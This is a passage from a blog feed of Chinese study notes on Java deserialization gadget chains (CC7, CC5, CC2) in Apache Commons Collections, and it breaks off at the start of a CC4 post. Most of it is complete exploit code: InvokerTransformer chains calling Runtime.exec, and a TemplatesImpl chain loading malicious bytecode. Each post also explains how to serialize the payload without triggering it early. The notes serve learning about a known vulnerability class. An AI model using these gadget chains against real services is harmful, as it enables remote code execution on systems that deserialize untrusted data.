org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializable</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializable</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;&#125;);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap1</span> <span class="hljs-operator">=</span>  LazyMap.decorate(hashMap1, chainedTransformer);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap2</span> <span class="hljs-operator">=</span>  LazyMap.decorate(hashMap2, chainedTransformer);<br><br>        lazymap1.put(<span class="hljs-string">&quot;yy&quot;</span>, <span class="hljs-number">1</span>);<br>        lazymap2.put(<span class="hljs-string">&quot;zZ&quot;</span>, <span class="hljs-number">1</span>);<br><br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        hashtable.put(lazymap1, <span class="hljs-number">1</span>);<br>        hashtable.put(lazymap2, <span class="hljs-number">1</span>);<br><br>        lazymap2.remove(<span class="hljs-string">&quot;yy&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> chainedTransformer.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;iTransformers&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(chainedTransformer, transformers);<br><br>        serializable(hashtable);<br>    &#125;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="小摊"><a href="#小摊" class="headerlink" title="小摊"></a>小摊</h3><h4 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">java<span class="hljs-selector-class">.util</span>.Hashtable<span class="hljs-selector-id">#readObject</span><br>java<span class="hljs-selector-class">.util</span>.Hashtable<span class="hljs-selector-id">#reconstitutionPut</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span>.AbstractMapDecorator<span class="hljs-selector-id">#equals</span><br>java<span class="hljs-selector-class">.util</span>.AbstractMap#equals<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java_CC5</title>
      <link href="/2025/04/02/Java-CC5/"/>
      <url>/2025/04/02/Java-CC5/</url>
      
        <content type="html"><![CDATA[<p>CC5</p><p>这里从 <code>org.apache.commons.collections.map.LazyMap#get</code>开始找，但是get方法的调用非常多，find usage就有2k+。代码审计老哥直接哭晕在厕所。</p><p><code>commons.collections4</code>的 <code>LazyMap</code>去掉了函数 <code>decorate</code>。</p><p>直接看<a href="####%E9%93%BE%E5%AD%90">链子</a></p><p>后半还是CC1的LazyMap，前半则是 <code>BadAttributeValueExpException</code>和 <code>TiedMapEntry</code>，整个流程只有一个注意点，就是实例化 <code>BadAttributeValueExpException</code>的时候。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BadAttributeValueExpException</span> <span class="hljs-params">(Object val)</span> &#123;<br>    <span class="hljs-built_in">this</span>.val = val == <span class="hljs-literal">null</span> ? <span class="hljs-literal">null</span> : val.toString();<br>&#125;<br><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(ObjectInputStream ois)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>    ObjectInputStream.<span class="hljs-type">GetField</span> <span class="hljs-variable">gf</span> <span class="hljs-operator">=</span> ois.readFields();<br>    <span class="hljs-type">Object</span> <span class="hljs-variable">valObj</span> <span class="hljs-operator">=</span> gf.get(<span class="hljs-string">&quot;val&quot;</span>, <span class="hljs-literal">null</span>);<br><br>    <span class="hljs-keyword">if</span> (valObj == <span class="hljs-literal">null</span>) &#123;<br>        val = <span class="hljs-literal">null</span>;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (valObj <span class="hljs-keyword">instanceof</span> String) &#123;<br>        val= valObj;<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (System.getSecurityManager() == <span class="hljs-literal">null</span><br>            || valObj <span class="hljs-keyword">instanceof</span> Long<br>            || valObj <span class="hljs-keyword">instanceof</span> Integer<br>            || valObj <span class="hljs-keyword">instanceof</span> Float<br>            || valObj <span class="hljs-keyword">instanceof</span> Double<br>            || valObj <span class="hljs-keyword">instanceof</span> Byte<br>            || valObj <span class="hljs-keyword">instanceof</span> Short<br>            || valObj <span class="hljs-keyword">instanceof</span> Boolean) &#123;<br>        val = valObj.toString();<br>    &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-comment">// the serialized object is from a version without JDK-8019292 fix</span><br>        val = System.identityHashCode(valObj) + <span class="hljs-string">&quot;@&quot;</span> + valObj.getClass().getName();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>实例化时的属性 <code>val</code>直接传入一个不为null的数据，则会直接调用 <code>val.toString()</code>。</p><p>解决方案：先传入null，序列化前反射修改<code>val</code>属性。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializable</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializable</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazymap</span> <span class="hljs-operator">=</span>  LazyMap.decorate(hashMap, chainedTransformer);<br><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazymap,<span class="hljs-string">&quot;key&quot;</span>);<br><span class="hljs-comment">//        tiedMapEntry.toString();</span><br><br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;javax.management.BadAttributeValueExpException&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(badAttributeValueExpException, tiedMapEntry);<br><br>        serializable(badAttributeValueExpException);<br>    &#125;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test2</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="小摊"><a href="#小摊" class="headerlink" title="小摊"></a>小摊</h3><p>搞定，吃的全是前几个链子的老本</p><h4 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">javax<span class="hljs-selector-class">.management</span>.BadAttributeValueExpException<span class="hljs-selector-id">#readObject</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span>.TiedMapEntry<span class="hljs-selector-id">#toString</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.keyvalue</span>.TiedMapEntry<span class="hljs-selector-id">#getValue</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections</span><span class="hljs-selector-class">.map</span>.LazyMap<span class="hljs-selector-id">#get</span><br>*<span class="hljs-selector-id">#transform</span>()<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java_CC2</title>
      <link href="/2025/04/01/Java-CC2/"/>
      <url>/2025/04/01/Java-CC2/</url>
      
        <content type="html"><![CDATA[<p>CC2</p><p>前几天意识到一个问题，就是链子在序列化之前就触发了的事，这次将序列化和反序列分开，是不是好看一点。</p><p>CC2 链区别与其他链子一点的区别在于没有用 <code>Transformer</code> 数组。不用数组是因为比如 shiro 当中的漏洞，它会重写很多动态加载数组的方法，这就可能会导致我们的 EXP 无法通过数组实现。</p><p>CC2就是CC4翻版，在使用 <code>InstantiateTransformer</code>初始化 <code>TrAXFilter</code>达到利用，转变为 直接使用<code>InvokerTransformer</code>调用 <code>TemplatesImpl.newTransformer()</code>。</p><h3 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h3><p>JDK8u65</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.commons<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-collections4<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.Transformer;<br><span class="hljs-keyword">import</span> org.junit.Test;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> javax.xml.transform.TransformerFactory;<br><span class="hljs-keyword">import</span> javax.xml.ws.spi.Invoker;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serializable</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserializable</span><span class="hljs-params">(String path)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(path));<br>        <span class="hljs-keyword">return</span> ois.readObject();<br>    &#125;<br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\javaSec\\CC\\src\\main\\java\\Calc.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        Class&lt;?&gt; clazz = templates.getClass();<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_name</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        _name.setAccessible(<span class="hljs-literal">true</span>);<br>        _name.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_bytecodes</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        _bytecodes.setAccessible(<span class="hljs-literal">true</span>);<br>        _bytecodes.set(templates, codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">_tfactory</span> <span class="hljs-operator">=</span> clazz.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        _tfactory.setAccessible(<span class="hljs-literal">true</span>);<br>        _tfactory.set(templates,<span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;newTransformer&quot;</span>,<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">queue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>(<span class="hljs-number">2</span>,transformingComparator);<br><br>        queue.add(templates);<br>        queue.add(templates);<br><br>        Class&lt;?&gt; c = transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformingField</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformingField.setAccessible(<span class="hljs-literal">true</span>);<br>        transformingField.set(transformingComparator,invokerTransformer);<br><br><br>        serializable(queue);<br>    &#125;<br><br>    <span class="hljs-meta">@Test</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">test3</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        unserializable(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="小谈"><a href="#小谈" class="headerlink" title="小谈"></a>小谈</h3><p>后面学的是更加得心应手了，有些地方是一点就通，继续坚持，孩儿们。其实好多</p><h4 id="链子"><a href="#链子" class="headerlink" title="链子"></a>链子</h4><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs stylus">动态记载<br>TemplatesImpl<span class="hljs-selector-class">.newTransformer</span>()<br>InvokerTransformer<span class="hljs-selector-class">.trans</span><br>org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.commons</span><span class="hljs-selector-class">.collections4</span><span class="hljs-selector-class">.comparators</span>.TransformingComparator<span class="hljs-selector-id">#compare</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#siftDownUsingComparator</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#siftDown</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue<span class="hljs-selector-id">#heapify</span><br>java<span class="hljs-selector-class">.util</span>.PriorityQueue#readObject<br></code></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java-CC4</title>
      <link href="/2025/04/01/Java_CC4/"/>
      <url>/2025/04/01/Java_CC4/</url>
      
